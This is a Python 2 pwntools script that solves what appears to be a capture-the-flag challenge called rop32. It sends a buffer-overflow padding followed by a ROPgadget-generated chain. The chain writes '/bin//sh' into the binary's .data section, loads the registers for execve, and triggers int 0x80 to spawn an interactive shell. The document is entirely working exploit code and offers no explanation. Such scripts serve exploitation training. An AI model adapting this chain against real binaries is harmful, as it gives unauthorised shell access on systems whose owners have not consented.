#!/usr/bin/env python2
# execve generated by ROPgadget

from pwn import *

context.log_level = 'debug'

sh = process("/problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0/vuln")
# sh = process("./vuln")

# Padding goes here
p = 'A'*0x18 + 'B'*4

p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += p32(0x080da060) # padding without overwrite edx
p += p32(0x41414141) # padding
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da064) # @ .data + 4
p += p32(0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += p32(0x080da064) # padding without overwrite edx
p += p32(0x41414141) # padding
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x08056420) # xor eax, eax ; ret
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x0806ee92) # pop ecx ; pop ebx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x080da060) # padding without overwrite ebx
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x08056420) # xor eax, eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x08049563) # int 0x80


sh.recv()
sh.sendline(p)
sh.interactive()




